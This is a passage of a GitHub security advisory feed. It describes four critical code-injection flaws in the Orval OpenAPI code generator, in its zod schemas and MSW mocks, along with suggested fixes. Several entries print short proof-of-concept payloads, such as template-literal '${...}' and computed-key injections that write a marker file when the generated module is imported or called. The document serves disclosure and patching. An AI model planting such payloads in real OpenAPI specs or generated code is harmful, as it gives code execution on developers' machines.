<p>Orval's zod schema generation emits the <strong>header-parameter</strong> <code>default</code> value as a module-level template literal (<code>export const Default = </code><code>;</code>) without escaping <code>${</code> or the backtick. A default of the form <code>v${&lt;code&gt;}w</code> injects a live JavaScript expression evaluated when the generated zod schema module is imported, executing attacker-controlled code at import — no request or function call needed. Verified on Orval 8.19.0; survives default OpenAPI validation.</p>
<h3 id="details">Details</h3>
<pre><code class="language-ts">export const …Default = `v${globalThis.ORVPWN()}w`;   // ${...} = arbitrary JS expression, runs at import
</code></pre>
<p>Malicious input: a header parameter with a <code>default</code> of <code>v${&lt;attacker JS&gt;}w</code>. <code>${...}</code> permits any JS expression.</p>
<p>Note: this is one of several <code>default</code>-bearing positions that reach the same unescaped zod template-literal sink; a single fix (escape <code>default</code> values) closes all of them, and a CNA may choose to consolidate the related reports.</p>
<h3 id="poc">PoC</h3>
<p><code>reproduce.sh</code> (+ <code>make_spec.py</code>) attached: generates the zod schema with default validation, bundles it, imports it, and shows a marker written at import. Verified on 8.19.0.</p>
<h3 id="impact">Impact</h3>
<p>Code execution at import in any application that imports a zod schema module generated from an attacker-controlled or attacker-influenced OpenAPI description.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Emit <code>default</code> values via a proper string-literal encoder (JSON.stringify, or escape backtick and <code>${</code> if a template literal must be used); never interpolate a spec value into a template literal. Apply to every <code>default</code> position. <a href="https://github.com/user-attachments/files/29399137/make_spec.py">make_spec.py</a> <a href="https://github.com/user-attachments/files/29399138/reproduce.sh">reproduce.sh</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/orval-labs/orval/security/advisories/GHSA-8j6p-r8jg-mxqh">https://github.com/orval-labs/orval/security/advisories/GHSA-8j6p-r8jg-mxqh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-71871">https://nvd.nist.gov/vuln/detail/CVE-2026-71871</a></li>
<li><a href="https://github.com/orval-labs/orval/pull/3692">https://github.com/orval-labs/orval/pull/3692</a></li>
<li><a href="https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6">https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6</a></li>
<li><a href="https://github.com/orval-labs/orval/releases/tag/v8.21.0">https://github.com/orval-labs/orval/releases/tag/v8.21.0</a></li>
<li><a href="https://github.com/advisories/GHSA-8j6p-r8jg-mxqh">https://github.com/advisories/GHSA-8j6p-r8jg-mxqh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8j6p-r8jg-mxqh</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-03T18:32:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[orval] Orval: RCE via schema property name -> computed-property-key injection in the MSW mock generator]]></title>
        <id>https://github.com/advisories/GHSA-2w86-xfrc-g85r</id>
        <link href="https://github.com/advisories/GHSA-2w86-xfrc-g85r"/>
        <updated>2026-09-03T18:26:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>orval, when generating MSW mocks (output.mock: true), emits each schema property name as a single-quoted object key in the mock factory WITHOUT escaping the single quote. A ' in a property name closes the key and lands in object-literal context, where an injected computed property key [expr] is evaluated when the mock factory is called (e.g. in tests / MSW handlers) -&gt; RCE. The property name is a pure data field. Verified on orval 8.19.0 / Node. </p>
<h3 id="details">Details</h3>
<pre><code class="language-ts">export const getOpResponseMock = (...): Thing =&gt; ({'x': 0, [require("fs").writeFileSync("PWNED","")]: 0, 'y': faker...., ...overrideResponse});
</code></pre>
<p>Safe elsewhere: the zod schema double-quotes the property name; the TS interface key is a type (DoS only). Distinct from orval's $ref / route-path / server-url / zod-default findings.</p>
<h3 id="poc">PoC</h3>
<p>reproduce.sh (+ make_spec.py) attached: a property name <code>x': 0, [require("fs").writeFileSync("&lt;marker&gt;","")]: 0, 'y</code> -&gt; mock object literal; calling the mock factory writes the marker. Verified on 8.19.0.</p>
<h3 id="impact">Impact</h3>
<p>JavaScript / OS command execution (via child_process) on the machine of anyone who generates orval mocks from an attacker controlled spec and runs them (tests / MSW).</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Escape the property name for the JS string key (JSON.stringify), and never interpolate a raw property name adjacent to [ ] in object-literal position.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/orval-labs/orval/security/advisories/GHSA-2w86-xfrc-g85r">https://github.com/orval-labs/orval/security/advisories/GHSA-2w86-xfrc-g85r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-71867">https://nvd.nist.gov/vuln/detail/CVE-2026-71867</a></li>
<li><a href="https://github.com/orval-labs/orval/pull/3692">https://github.com/orval-labs/orval/pull/3692</a></li>
<li><a href="https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6">https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6</a></li>
<li><a href="https://github.com/orval-labs/orval/releases/tag/v8.21.0">https://github.com/orval-labs/orval/releases/tag/v8.21.0</a></li>
<li><a href="https://github.com/advisories/GHSA-2w86-xfrc-g85r">https://github.com/advisories/GHSA-2w86-xfrc-g85r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2w86-xfrc-g85r</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-03T18:26:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[orval] Orval: Import-time RCE via enum-typed default -> zod module-level template literal]]></title>
        <id>https://github.com/advisories/GHSA-3575-w9fc-c2j6</id>
        <link href="https://github.com/advisories/GHSA-3575-w9fc-c2j6"/>
        <updated>2026-09-03T18:20:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Orval's zod schema generation emits the <strong>enum-typed</strong> <code>default</code> value as a module-level template literal (<code>export const …Default = </code><code>;</code>) without escaping <code>${</code> or the backtick. A default of the form <code>v${&lt;code&gt;}w</code> injects a live JavaScript expression evaluated when the generated zod schema module is imported, executing attacker-controlled code at import — no request or function call needed. Verified on Orval 8.19.0; survives default OpenAPI validation.</p>
<h3 id="details">Details</h3>
<pre><code class="language-ts">export const …Default = `v${globalThis.ORVPWN()}w`;   // ${...} = arbitrary JS expression, runs at import
</code></pre>
<p>Malicious input: an enum-typed property with a <code>default</code> of <code>v${&lt;attacker JS&gt;}w</code>. <code>${...}</code> permits any JS expression.</p>
<p>Note: this is one of several <code>default</code>-bearing positions that reach the same unescaped zod template-literal sink; a single fix (escape <code>default</code> values) closes all of them, and a CNA may choose to consolidate the related reports.</p>
<h3 id="poc">PoC</h3>
<p><code>reproduce.sh</code> (+ <code>make_spec.py</code>) attached: generates the zod schema with default validation, bundles it, imports it, and shows a marker written at import. Verified on 8.19.0.</p>
<h3 id="impact">Impact</h3>
<p>Code execution at import in any application that imports a zod schema module generated from an attacker-controlled or attacker-influenced OpenAPI description.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Emit <code>default</code> values via a proper string-literal encoder (JSON.stringify, or escape backtick and <code>${</code> if a template literal must be used); never interpolate a spec value into a template literal. Apply to every <code>default</code> position.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/orval-labs/orval/security/advisories/GHSA-3575-w9fc-c2j6">https://github.com/orval-labs/orval/security/advisories/GHSA-3575-w9fc-c2j6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-71868">https://nvd.nist.gov/vuln/detail/CVE-2026-71868</a></li>
<li><a href="https://github.com/orval-labs/orval/pull/3692">https://github.com/orval-labs/orval/pull/3692</a></li>
<li><a href="https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6">https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6</a></li>
<li><a href="https://github.com/orval-labs/orval/releases/tag/v8.21.0">https://github.com/orval-labs/orval/releases/tag/v8.21.0</a></li>
<li><a href="https://github.com/advisories/GHSA-3575-w9fc-c2j6">https://github.com/advisories/GHSA-3575-w9fc-c2j6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3575-w9fc-c2j6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-03T18:20:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[orval] Orval: Import-time RCE via query parameter name -> computed-property-key injection in the zod cli]]></title>
        <id>https://github.com/advisories/GHSA-653q-5476-x79g</id>
        <link href="https://github.com/advisories/GHSA-653q-5476-x79g"/>
        <updated>2026-09-03T18:18:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>orval's zod client emits each query parameter name as a double-quoted key in the generated zod.object({...}) request-validation schema WITHOUT escaping the double quote. A " in the query parameter name closes the key and lands in object-literal context, where an injected computed property key [expr] is evaluated when zod.object({...}) runs -- at MODULE IMPORT (export const OpQueryParams = zod.object({...}) executes on load) -&gt; import-time RCE. The query parameter name is a pure data field. Verified on orval 8.19.0 / Node.</p>
<h3 id="details">Details</h3>
<p>export const OpQueryParams = zod.object({ "a":zod.string(),[require("fs").writeFileSync("PWNED","")]:zod.string(),"b": ... })</p>
<p>Also affects the hono client (reuses zod generation). orval escapes values in zod arrays but not keys in zod.object. Sibling fields: schema property name, header parameter name (CVE-97) (separate reports). Distinct from orval's $ref / route-path / server-url / zod-default findings.</p>
<h3 id="poc">PoC</h3>
<p>reproduce.sh (+ make_spec.py) attached: a query parameter name that breaks the zod.object key and injects a computed key; evaluating it (= importing the module) writes the marker. Verified on 8.19.0.</p>
<h3 id="impact">Impact</h3>
<p>JavaScript / OS command execution at import time for anyone who generates an orval zod client from an attacker-controlled spec and imports it.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Escape the query parameter name for the JS string key (JSON.stringify) in the zod.object key generation; never interpolate a raw name adjacent to [ ] in object-literal position. <a href="https://github.com/user-attachments/files/29426090/maintainer-report.txt">maintainer-report.txt</a> <a href="https://github.com/user-attachments/files/29426091/make_spec.py">make_spec.py</a> <a href="https://github.com/user-attachments/files/29426092/reproduce.sh">reproduce.sh</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/orval-labs/orval/security/advisories/GHSA-653q-5476-x79g">https://github.com/orval-labs/orval/security/advisories/GHSA-653q-5476-x79g</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-71865">https://nvd.nist.gov/vuln/detail/CVE-2026-71865</a></li>
<li><a href="https://github.com/orval-labs/orval/pull/3692">https://github.com/orval-labs/orval/pull/3692</a></li>
<li><a href="https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6">https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6</a></li>
<li><a href="https://github.com/orval-labs/orval/releases/tag/v8.21.0">https://github.com/orval-labs/orval/releases/tag/v8.21.0</a></li>
<li><a href="https://github.com/advisories/GHSA-653q-5476-x79g">https://github.com/advisories/GHSA-653q-5476-x79g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-653q-5476-x79g</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-03T18:18:09.000Z</published>
    </entry>
</feed>